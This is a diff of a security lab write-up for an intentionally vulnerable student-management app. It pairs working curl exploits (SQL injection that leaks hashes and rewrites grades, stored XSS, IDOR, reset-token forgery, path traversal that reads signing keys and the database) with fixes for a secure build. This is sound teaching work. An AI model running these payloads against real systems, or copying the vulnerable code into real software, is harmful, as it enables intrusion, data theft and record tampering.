@@ -143,7 +143,12 @@ fails (HMAC mismatch).
 
 ---
 
-## 4. IDOR — read anyone's private conversation
+## 4. IDOR — private chats and student documents
+
+Two insecure-direct-object-reference bugs with the same root cause: the object is
+chosen entirely by an id in the request, with no check that the caller may access it.
+
+### 4a. Read anyone's private conversation
 
 **Where:** `app.py → h_chat` (`GET /api/chat?chat_users[0]=..&chat_users[1]=..`).
 The conversation is chosen entirely by the two user ids in the URL, with no check
@@ -183,6 +188,29 @@ if not (me["role"] == "admin" or ident.get("sub") in (u0, u1)):
 
 **Verify:** as `alice`, `chat_users[0]=1&chat_users[1]=2` returns `403`; your own
 conversation (`4` & `5`) returns `200`.
+
+### 4b. Read any student's document
+
+**Where:** `app.py → h_get_document` (`GET /api/documents/<id>`). A student requests
+official documents (attestation, transcript); an approved one is viewable by id, with
+no check that the caller owns it.
+
+**Exploit** — as `alice`, read another student's document by walking the id (ids
+appear in your own request list):
+
+```bash
+curl -s $B/api/documents/1 -H "Authorization: Bearer $TOK"   # not alice's -> leaked
+```
+
+**Impact:** disclosure of other students' documents (name, e-mail, reference).
+**Fix (secure build):** a student may read only their own document; staff/admin any.
+
+```python
+if me["role"] == "student" and doc["student_id"] != me["id"]:
+    return 403
+```
+
+**Verify:** in the secure build the foreign id returns `403`; your own returns `200`.
 
 ---
 
@@ -288,8 +316,8 @@ c["verified"] = True        # signatures are never checked, ledger never consult
 
 So a certificate that was never issued by a professor is indistinguishable from a
 genuine one. And an attacker does **not** need database access to plant one — a plain
-logged-in student can inject it through the **stacked-query SQL injection** in the
-course search (#9):
+logged-in student can inject it through a **stacked-query SQL injection** in the
+course search:
 
 ```bash
 B=http://127.0.0.1:3000
@@ -350,8 +378,7 @@ rows = db.run(conn,
     ("%" + query + "%", "%" + query + "%"))
 ```
 
-So in the secure build the injection above returns no rows and inserts nothing. (Full
-treatment of the injection itself is #9.)
+So in the secure build the injection above returns no rows and inserts nothing.
 
 #### How the secure build defends the certificate itself
 
@@ -505,121 +532,7 @@ against attackers who can write to the *database*, which is the threat here.
 
 ---
 
-## 9. SQL injection — course search (stacked write)
-
-**Where:** `app.py → h_search` (`GET /api/search?query=`), the **Course search**
-page. The search term is concatenated into a `LIKE` pattern and run with
-`db.run_raw_multi`, which also executes **stacked** statements (`;`-separated):
-
-```python
-# VULN
-sql = ("SELECT id, code, name FROM courses "
-       "WHERE name LIKE '%" + query + "%' OR code LIKE '%" + query + "%' ORDER BY code")
-rows = db.run_raw_multi(conn, sql)   # runs every statement in the string
-```
-
-Unlike #1 and #2 (read-only injections), this one gives an attacker a **write
-primitive** — and it needs no admin login and no access to the Gradebook page.
-Any logged-in user (a student) can change any grade straight from the search box.
-
-**Exploit A** — UNION read, leak password hashes (the result has 3 columns —
-`id, code, name` — so a 3-column UNION lines up):
-
-```bash
-TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
-      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
-
-curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
-  --data-urlencode "query=' UNION SELECT id, password_hash, role FROM users -- "
-# every user's MD5 hash appears in the 'code' column
-```
-
-**Exploit B** — stacked `UPDATE`, change Alice's Mathematics grade (course 1):
-
-```bash
-curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
-  --data-urlencode "query=%'; UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1; -- "
-# results come back empty, but /api/my/grades now shows 20.00 — a student just
-# rewrote their own grade through a search box.
-```
-
-In the browser: log in as `alice` / `password1`, open **Course search**, and paste
-the Exploit B string into the search field. The search shows no matches, but the
-Math grade on the Dashboard is now 20/20. The vuln build has no ledger, so (as in
-#8) nothing detects it.
-
-**Fix (secure build):** bind the term as a parameter — it is then only ever data,
-never SQL — and the query stays a single statement, so stacking is impossible:
-
-```python
-rows = db.run(conn,
-    "SELECT id, full_name, role FROM users WHERE full_name LIKE ? ORDER BY full_name",
-    ("%" + query + "%",))
-```
-
-**Verify:** on the secure build the same Exploit B payload returns no results and
-leaves the grade at 14.00; `/api/grades/integrity` still shows `ok:true`. (Even if
-an attacker reached the database directly, the #8 ledger would flag the change.)
-
----
-
-## 10. Stored XSS — announcements feed
-
-**Where:** `app.py → h_post_announcement` (storage) and `static/app.js → announceBody`
-(output). Staff post to a shared news feed; the body is stored verbatim and rendered
-for every reader on the Announcements page and the dashboard widget.
-
-```js
-// VULN: the body is injected as raw HTML
-function announceBody(body) { return MODE === "secure" ? esc(body) : (body || ""); }
-```
-
-**Exploit** — as a professor (or a student who escalated via #5/#12), post an
-announcement whose body is a script. It runs in every reader's browser, including
-the admin's:
-
-```bash
-PT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
-     -d '{"username":"prof_jones","password":"teach456"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
-curl -s -X POST $B/api/announcements -H "Authorization: Bearer $PT" \
-  -H 'Content-Type: application/json' \
-  -d '{"title":"Timetable","body":"<img src=x onerror=\"document.title=document.cookie\">"}'
-# open the Announcements page in the vuln build -> the payload fires
-```
-
-**Impact:** session/token theft, actions performed as any viewer (stored, so it hits
-everyone who loads the feed). **Fix (secure build):** HTML-escape on output
-(`esc`) — the payload renders as inert text. **Verify:** the same announcement
-shows as literal text in the secure build and never executes.
-
----
-
-## 11. IDOR — read any student's document
-
-**Where:** `app.py → h_get_document` (`GET /api/documents/<id>`). A student requests
-official documents (attestation, transcript); an approved one is viewable by id, with
-no check that the caller owns it.
-
-**Exploit** — as `alice`, read another student's document by walking the id (ids
-appear in your own request list):
-
-```bash
-curl -s $B/api/documents/1 -H "Authorization: Bearer $TOK"   # not alice's -> leaked
-```
-
-**Impact:** disclosure of other students' documents (name, e-mail, reference).
-**Fix (secure build):** a student may read only their own document; staff/admin any.
-
-```python
-if me["role"] == "student" and doc["student_id"] != me["id"]:
-    return 403
-```
-
-**Verify:** in the secure build the foreign id returns `403`; your own returns `200`.
-
----
-
-## 12. Mass assignment — profile update sets privileged columns
+## 9. Mass assignment — profile update sets privileged columns
 
 **Where:** `app.py → h_update_profile` (`POST /api/profile`). The vuln build writes
 every key in the body to the user row; the form only exposes name/email/phone/address.
@@ -645,83 +558,88 @@ build):** write only an explicit whitelist (`full_name, email, phone, address`);
 
 ---
 
-## 13. Predictable password-reset token
+## 10. Unrestricted file upload
 
-**Where:** `app.py → _reset_token` / `h_reset_request` / `h_reset_confirm`.
-
-```python
-# VULN: token is a function of the (public) username, no randomness, no expiry
-return hashlib.md5(("reset:" + username).encode()).hexdigest()[:12]
-```
-
-**Exploit** — take over any account knowing only its username (public in the
-directory). Trigger a reset, then compute the same token offline and set a new
-password:
-
-```bash
-curl -s -X POST $B/api/password-reset/request -H 'Content-Type: application/json' -d '{"username":"carol"}'
-TOK=$(python3 -c "import hashlib;print(hashlib.md5(b'reset:carol').hexdigest()[:12])")
-curl -s -X POST $B/api/password-reset/confirm  -H 'Content-Type: application/json' \
-  -d "{\"token\":\"$TOK\",\"new_password\":\"pwned123\"}"    # -> carol's password is now pwned123
-```
-
-(The vuln build also returns the token in the response.) **Impact:** account
-takeover of anyone. **Fix (secure build):** a cryptographically random
-`secrets.token_urlsafe` token, stored hashed, single-use, expiring in 15 minutes,
-never returned in the response and with a response that doesn't reveal whether the
-account exists. **Verify:** the guessed MD5 token returns `400` on the secure build;
-only the random token from the server log works, once.
-
----
-
-## 14. Unrestricted file upload + path traversal + IDOR (documents)
-
-**Where:** `app.py → _save_upload`, `h_request_document`, `h_decide_document`,
-`h_download_document`. Students attach a PDF to a document request; the registrar
-uploads the issued PDF when approving. The vuln build trusts everything:
+**Where:** `app.py → _save_upload`, `h_request_document`. A student attaches a
+supporting file to a document request. The vuln build does **no validation** — no
+content-type, extension or size check — and stores the file under the
+**client-supplied filename**:
 
 ```python
 # VULN _save_upload: client filename trusted, no type/size check
 name = fs.filename or "upload.bin"
 fs.save(os.path.join(UPLOAD_DIR, name))
+```
 
-# VULN download: no ownership check, client-controlled path, served INLINE
+**Exploit** — attach a file of any type and any size (an executable, an HTML page, a
+multi-GB file); it is accepted and saved verbatim. Because the filename comes from the
+client, a predictable or colliding name can also overwrite another upload:
+
+```bash
+curl -s -X POST $B/api/documents -H "Authorization: Bearer $TOK" \
+  -F "doc_type=Attestation d'inscription" -F "attachment=@evil.html"
+# accepted — a non-PDF "document" is stored as-is, under the name we chose
+```
+
+**Impact:** arbitrary, unvalidated content on the server; no size limit (storage
+exhaustion); and, with a trusted filename, collisions/overwrites. **Fix (secure
+build):** require a real PDF (magic bytes `%PDF-`) under a 5 MB cap, and store under a
+random, server-generated name — never the client's:
+
+```python
+# SECURE _save_upload
+if len(data) > 5 * 1024 * 1024:   raise ValueError("file too large (max 5 MB)")
+if not data.startswith(b"%PDF-"): raise ValueError("only PDF files are accepted")
+name = secrets.token_hex(16) + ".pdf"
+```
+
+**Verify:** `evil.html` (or an oversized file) is rejected with "only PDF files are
+accepted"; a valid PDF is stored under a random `.pdf` name inside `uploads/`.
+
+---
+
+## 11. Path traversal — arbitrary file read on download
+
+**Where:** `app.py → h_download_document` (`GET /api/documents/<id>/download`). The
+download normally serves the file recorded for a document, but the vuln build lets the
+client override the served path with a `name` parameter, joined onto the upload
+directory with no sanitisation:
+
+```python
+# VULN download: served path taken from the client, no sanitisation
 name = request.args.get("name") or stored
 return send_file(os.path.join(UPLOAD_DIR, name))
 ```
 
-**Exploit A — stored XSS via upload type** — upload a `.svg`/`.html` "document"
-containing a script; it is served inline, so it runs when anyone opens it
-(including the registrar reviewing the request):
+`os.path.join(UPLOAD_DIR, "../../secret")` escapes the upload directory, so `name` can
+point at anything the server process can read.
+
+**Exploit** — walk out of `uploads/` to leak server secrets (any existing document id
+works, e.g. `1`):
 
 ```bash
-printf '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.svg
-ID=$(curl -s -X POST $B/api/documents -H "Authorization: Bearer $TOK" \
-     -F "doc_type=Attestation d'inscription" -F "attachment=@evil.svg" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
-# open  $B/api/documents/$ID/download?which=request  in a browser -> the script runs
+curl -s "$B/api/documents/1/download?name=../../keys/issuer_ed25519.pem" -H "Authorization: Bearer $TOK"
+#   -> the Ed25519 certificate signing key (forge "valid" certificates)
+curl -s "$B/api/documents/1/download?name=../../sms_vuln.db" -H "Authorization: Bearer $TOK" -o stolen.db
+#   -> the entire database   (on the secure build try ../../keys/eth_issuer.key for the on-chain key)
 ```
 
-**Exploit B — path traversal (arbitrary file read)** — the `name` parameter is
-joined onto the upload path with no sanitisation, so it escapes the directory:
+This is the same endpoint the Documents page's download buttons call (`downloadDoc()`
+in `app.js`); the UI only ever requests the recorded file, so you add `?name=` by hand
+in Burp/curl.
 
-```bash
-curl -s "$B/api/documents/$ID/download?name=../../keys/eth_issuer.key" -H "Authorization: Bearer $TOK"
-#   -> leaks the on-chain issuer private key
-curl -s "$B/api/documents/$ID/download?name=../../sms_vuln.db"          -H "Authorization: Bearer $TOK" -o stolen.db
-#   -> downloads the entire database
+**Impact:** disclosure of any file the server can read — the signing key, the database,
+source code. **Fix (secure build):** never accept a path from the client; serve only
+the file recorded for that document id, as an attachment with a fixed PDF type:
+
+```python
+# SECURE: ignore any client path; serve the stored file as an attachment
+return send_file(os.path.join(UPLOAD_DIR, stored), mimetype="application/pdf",
+                 as_attachment=True, download_name=f"{doc['reference'] or doc_id}.pdf")
 ```
 
-**Exploit C — IDOR** — any logged-in user downloads any document's file by id,
-regardless of owner (`?which=request` on someone else's document id).
-
-**Impact:** stored XSS against staff, disclosure of server secrets (signing key,
-database) and of other students' documents. **Fix (secure build):** ignore the
-client filename and store under a random name; require a real PDF (magic bytes)
-under a size cap; serve only the file recorded for that document id, as an
-`attachment` with a fixed `application/pdf` type, never from a client path; and
-enforce owner/staff authorization on download. **Verify:** `evil.svg` is rejected
-("only PDF files are accepted"); `?name=…` is ignored; another student's file
-returns `403`; a valid PDF downloads as an attachment.
+**Verify:** `?name=../../keys/eth_issuer.key` is ignored; the download returns only the
+document's own PDF (or `404` if it has none).
 
 ---
 
@@ -733,7 +651,7 @@ a real engagement, without changing whether they exist:
 - **Credential leak via the admin user list (#7)** — the vuln `GET /api/admin/users`
   still returns `password_hash` (sensitive-data exposure), but the Users page no
   longer renders it; you find it in the Network tab / Burp, not in a visible column.
-- **IDOR recon (#4, #11)** — internal ids are no longer printed in the UI (directory,
+- **IDOR recon (#4)** — internal ids are no longer printed in the UI (directory,
   dashboards, dropdowns, profile). They still appear in JSON and in the chat URL,
   which is the normal recon path.
 - **#5 role escalation** — the disabled "Account type" field was removed from the
@@ -749,17 +667,14 @@ a real engagement, without changing whether they exist:
 | 1 | SQLi login bypass | parameterized query |
 | 2 | SQLi in certifications | parameterized query + authorization |
 | 3 | JWT not verified / `alg:none` | pin alg, verify HMAC, check exp |
-| 4 | IDOR on chat conversations | ownership/role check |
+| 4 | IDOR — private chats and student documents | ownership/role check |
 | 5 | Privilege escalation at registration | server-assigned role |
 | 6 | Unsalted MD5 passwords | PBKDF2 + salt |
 | 7 | No signatures / no encryption at rest | Ed25519 signatures + AES-GCM |
 | 8 | No integrity anchoring (tampering undetected) | issuer-only smart contract: anchor hashes on write, verify on read |
-| 9 | SQLi in course search (stacked write → grade change) | parameterized query, single statement |
-| 10 | Stored XSS in announcements | HTML-escape on output |
-| 11 | IDOR on documents | ownership/role check |
-| 12 | Mass assignment on profile update | server-side field whitelist |
-| 13 | Predictable password-reset token | random, hashed, single-use, expiring token |
-| 14 | Unrestricted upload + path traversal + IDOR (documents) | PDF-only + random name, fixed id/path, attachment, authz |
+| 9 | Mass assignment on profile update | server-side field whitelist |
+| 10 | Unrestricted file upload | PDF magic-bytes + size cap + random server-side name |
+| 11 | Path traversal on download | serve only the recorded file, never a client path |
 
 **Secure-build business rules** (flaws only in the vuln build, not numbered attacks):
 grades must be numeric and within 0–20; certificates enforce a minimum grade
